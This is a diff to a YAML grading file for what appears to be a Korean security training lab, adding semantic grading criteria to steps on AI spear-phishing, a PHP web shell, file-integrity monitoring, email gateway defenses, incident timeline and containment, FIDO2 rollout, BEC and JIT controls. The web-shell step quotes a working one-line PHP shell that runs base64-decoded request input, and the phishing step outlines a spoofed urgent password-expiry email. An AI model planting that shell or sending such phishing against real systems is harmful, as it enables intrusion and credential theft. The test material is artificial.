@@ -35,6 +35,21 @@ steps:
     type: output_contains
     expect: 긴급
     field: stdout
+    semantic:
+      intent: '[공격] AI 피싱 메일 — cat > phish.eml: From security@company-internal.tk / Subject 긴급 비밀번호 만료
+        / LinkedIn 기반 이름·부서·프로젝트 / 링크. AI Spear Phishing. T1566.002.'
+      success_criteria:
+      - 긴급 키워드
+      - 피싱 외관
+      - LinkedIn 맞춤
+      acceptable_methods:
+      - GoPhish
+      - King Phisher
+      - Social Engineer Toolkit
+      negative_signs:
+      - 맞춤화 없음
+      - 링크 없음
+      - From spoof 없음
   target_vm: bastion
   script: 'mkdir -p ~/w07 && cat > ~/w07/phish.eml <<''E''
 
@@ -68,6 +83,21 @@ steps:
     type: output_contains
     expect: small.php
     field: stdout
+    semantic:
+      intent: '[공격] PHP 웹셸 — cat > small.php: <?php if($_REQUEST[''c'']) system(base64_decode($_REQUEST[''c'']));
+        경량 PHP 웹셸. T1505.003.'
+      success_criteria:
+      - small.php 파일
+      - base64_decode
+      - system 실행
+      acceptable_methods:
+      - Tiny PHP webshell
+      - WSO webshell
+      - China Chopper
+      negative_signs:
+      - PHP 아님
+      - system 없음
+      - encode 없음
   target_vm: web
   script: 'cat > ~/w07/small.php <<''P''
 
@@ -95,8 +125,25 @@ steps:
   answer_detail: '[탐지] auditd/Wazuh FIM.'
   verify:
     type: output_contains
-    expect: webroot
+    expect:
+    - webroot
+    - FIM
     field: stdout
+    semantic:
+      intent: '[탐지] 웹셸 FIM — cat > fim.rules: -w /var/www/html -p wa -k webroot_write + -w /var/www. auditd/Wazuh
+        FIM 웹루트 감시.'
+      success_criteria:
+      - webroot/FIM
+      - -w /var/www + -p wa
+      - 키
+      acceptable_methods:
+      - auditd -w
+      - Wazuh syscheck
+      - OSSEC FIM
+      negative_signs:
+      - -p wa 없음
+      - 경로 없음
+      - 키 누락
   target_vm: web
   script: 'cat > ~/w07/fim.rules <<''R''
 
@@ -132,6 +179,21 @@ steps:
     type: output_contains
     expect: DMARC
     field: stdout
+    semantic:
+      intent: '[탐지] 이메일 게이트웨이 4층 — cat > email-gate.md: DMARC reject / SPF hardfail / DKIM 필수 / AI 분류기.
+        피싱 방어 4층.'
+      success_criteria:
+      - DMARC 키워드
+      - 4 방어
+      - AI 분류기
+      acceptable_methods:
+      - DMARC/SPF/DKIM
+      - Proofpoint
+      - MailGun scan
+      negative_signs:
+      - 층 2개 이하
+      - DMARC 없음
+      - 분류기 없음
   target_vm: bastion
   script: 'cat > ~/w07/email-gate.md <<''M''
 
@@ -177,6 +239,21 @@ steps:
     - 웹셸
     - 재구성
     field: stdout
+    semantic:
+      intent: '[분석] 체인 재구성 — cat > chain.md: T+0 피싱 / T+10 클릭 / T+15 OAuth 동의 / T+30 메일박스 / T+60 내부 업로드
+        / T+70 웹셸. 6 단계 타임라인.'
+      success_criteria:
+      - 웹셸/재구성
+      - 6 단계
+      - T+ 시간축
+      acceptable_methods:
+      - Plaso timeline
+      - Markdown timeline
+      - Elastic timeline
+      negative_signs:
+      - 단계 3개 이하
+      - 시간 없음
+      - 웹셸 없음
   target_vm: bastion
   script: 'cat > ~/w07/chain.md <<''M''
 
@@ -218,6 +295,21 @@ steps:
     type: output_contains
     expect: 분리
     field: stdout
+    semantic:
+      intent: '[분석] 주체 분리 — cat > subject.md: Human 단계 피싱 인프라 도메인/호스팅 vs Agent 단계 IAT/경로 다양성 지문. 책임·귀속
+        분리.'
+      success_criteria:
+      - 분리 키워드
+      - Human vs Agent
+      - 책임 귀속
+      acceptable_methods:
+      - Diamond Model
+      - Kill Chain 주체 구분
+      - STIX Threat Actor
+      negative_signs:
+      - 분리 없음
+      - 주체 단일
+      - 책임 없음
   target_vm: bastion
   script: 'cat > ~/w07/subject.md <<''M''
 
@@ -257,6 +349,21 @@ steps:
     - 회수
     - 체인단절
     field: stdout
+    semantic:
+      intent: '[초동] 체인 단절 4 전략 — cat > cut.md: 피싱 메일 회수 / 발판 웹셸 격리 / 에이전트 세션 종료 / 유출 egress 차단·싱크홀. 가장
+        빠른 단계 공략.'
+      success_criteria:
+      - 회수/체인단절
+      - 4 전략
+      - 빠른 단계
+      acceptable_methods:
+      - Kill Chain disruption
+      - NIST IR Contain
+      - Sinkhole
+      negative_signs:
+      - 전략 2개 이하
+      - 회수 없음
+      - 싱크홀 없음
   target_vm: bastion
   script: 'cat > ~/w07/cut.md <<''M''
 
@@ -278,9 +385,9 @@ steps:
   hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
   category: analysis
   points: 16
-  answer: "cat > ~/w07/agent.yaml <<'Y'\nplaybook_id: pb-hybrid-chain\nsteps:\n  -\
-    \ skill: quarantine_webshell_file\n  - skill: block_url_path\n  - skill: sinkhole_attacker_domain\n\
-    \  - skill: terminate_user_sessions\n  - skill: require_mfa_reauth\nY\ncat ~/w07/agent.yaml"
+  answer: "cat > ~/w07/agent.yaml <<'Y'\nplaybook_id: pb-hybrid-chain\nsteps:\n  - skill: quarantine_webshell_file\n\
+    \  - skill: block_url_path\n  - skill: sinkhole_attacker_domain\n  - skill: terminate_user_sessions\n\
+    \  - skill: require_mfa_reauth\nY\ncat ~/w07/agent.yaml"
   answer_detail: '[초동대응] 수 초 반응.'
   verify:
     type: output_contains
@@ -288,10 +395,25 @@ steps:
     - webshell
     - Playbook
     field: stdout
+    semantic:
+      intent: '[초동] Agent Playbook — cat > agent.yaml: pb-hybrid-chain + quarantine_webshell_file / block_url_path
+        / sinkhole_attacker_domain / terminate_user_sessions / require_mfa_reauth. 수 초 반응.'
+      success_criteria:
+      - webshell/Playbook
+      - 5 steps
+      - MFA reauth
+      acceptable_methods:
+      - Bastion Playbook
+      - SOAR playbook
+      - Shuffle
+      negative_signs:
+      - steps 3개 이하
+      - MFA 없음
+      - sinkhole 없음
   target_vm: bastion
-  script: "cat > ~/w07/agent.yaml <<'Y'\nplaybook_id: pb-hybrid-chain\nsteps:\n  -\
-    \ skill: quarantine_webshell_file\n  - skill: block_url_path\n  - skill: sinkhole_attacker_domain\n\
-    \  - skill: terminate_user_sessions\n  - skill: require_mfa_reauth\nY\ncat ~/w07/agent.yaml"
+  script: "cat > ~/w07/agent.yaml <<'Y'\nplaybook_id: pb-hybrid-chain\nsteps:\n  - skill: quarantine_webshell_file\n\
+    \  - skill: block_url_path\n  - skill: sinkhole_attacker_domain\n  - skill: terminate_user_sessions\n\
+    \  - skill: require_mfa_reauth\nY\ncat ~/w07/agent.yaml"
   risk_level: low
   bastion_prompt: ''
 - order: 9
@@ -319,6 +441,21 @@ steps:
     - MFA
     - 브리핑
     field: stdout
+    semantic:
+      intent: '[보고] 브리핑 — cat > exec.md: What AI 피싱 → 웹셸 Bastion 18초 격리 / Impact 직원 A 메일 30일 접근 내부 문서
+        확인 중 / Ask FIDO2 MFA 전사 + 피싱 교육 월 1회.'
+      success_criteria:
+      - MFA/브리핑
+      - What+Impact+Ask
+      - FIDO2
+      acceptable_methods:
+      - Markdown 1쪽
+      - Exec brief
+      - CxO update
+      negative_signs:
+      - 섹션 부족
+      - MFA 없음
+      - Ask 없음
   target_vm: bastion
   script: 'cat > ~/w07/exec.md <<''M''
 
@@ -358,6 +495,21 @@ steps:
     type: output_contains
     expect: FIDO
     field: stdout
+    semantic:
+      intent: '[재발방지] FIDO2 이행 — cat > fido2.md: Phase 1 (30일) 관리자·경영진 / Phase 2 (90일) 재무·법무 / Phase 3
+        (180일) 전사 + Authenticator app 백업. 피싱 저항.'
+      success_criteria:
+      - FIDO 키워드
+      - 3 단계
+      - 백업 수단
+      acceptable_methods:
+      - FIDO2 YubiKey
+      - Passkey deployment
+      - WebAuthn
+      negative_signs:
+      - 단계 1-2개
+      - 백업 없음
+      - 기간 없음
   target_vm: bastion
   script: 'cat > ~/w07/fido2.md <<''M''
 
@@ -395,6 +547,20 @@ steps:
     type: output_contains
     expect: 지연
     field: stdout
+    semantic:
+      intent: '[재발방지] BEC 탐지 — cat > bec.md: 결제 경로 변경 감지 / 관리자 재확인 / 새 계좌 등록 48h 지연. 금전 손실 대비.'
+      success_criteria:
+      - 지연 키워드
+      - 3 정책
+      - 48h
+      acceptable_methods:
+      - BEC detection
+      - Proofpoint TAP
+      - Microsoft Defender for O365
+      negative_signs:
+      - 48h 없음
+      - 정책 2개 이하
+      - 금전 맥락 없음
   target_vm: bastion
   script: 'cat > ~/w07/bec.md <<''M''
 
@@ -430,6 +596,20 @@ steps:
     type: output_contains
     expect: JIT
     field: stdout
+    semantic:
+      intent: '[재발방지] JIT 특권 — cat > jit.md: 특권 접근 일회 승인 / 세션 녹화 / 영구 admin 제거. 유출 영향 최소화.'
+      success_criteria:
+      - JIT 키워드
+      - 3 원칙
+      - 영구 admin 제거
+      acceptable_methods:
+      - CyberArk JIT
+      - BeyondTrust
+      - Azure PIM
+      negative_signs:
+      - JIT 없음
+      - 녹화 없음
+      - 영구 admin 제거 누락
   target_vm: bastion
   script: 'cat > ~/w07/jit.md <<''M''
 
